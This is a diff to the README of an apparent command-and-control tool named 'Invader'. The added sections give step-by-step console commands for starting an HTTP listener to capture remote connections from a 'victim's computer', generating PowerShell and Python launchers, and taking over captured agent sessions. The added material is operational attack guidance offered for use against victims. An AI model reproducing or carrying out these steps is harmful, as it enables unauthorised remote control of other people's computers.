@@ -23,7 +23,46 @@
 > chmod +x install.sh
 
 > ./install.sh
+
+***
+
+# How to build listener
+
+    INFO: Invader listener is intended to capture 
+    the remote connection to the victim's computer.
+
+## Windows listener
+
+> invader
+
+    (Invader)> listeners
+    (Invader: listeners)> uselistener http
+    (Invader: listeners/http)> execute
+    (Invader: listeners/http)> launcher powershell
     
+# Linux listener
+
+> invader
+
+    (Invader)> listeners
+    (Invader: listeners)> uselistener http
+    (Invader: listeners/http)> execute
+    (Invader: listeners/http)> launcher python
+    
+***
+
+# Interacting with a session
+
+    INFO: After capturing a remote connection, you 
+    need to select an open session to interact with it.
+
+> invader 
+
+    (Invader: listeners/http)> agents
+    (Invader: agents)> interact <MachineName>
+    (Invader: MachineName)> rename comp1
+    (Invader: comp1)> info
+
 ***
 
 # Terms of use
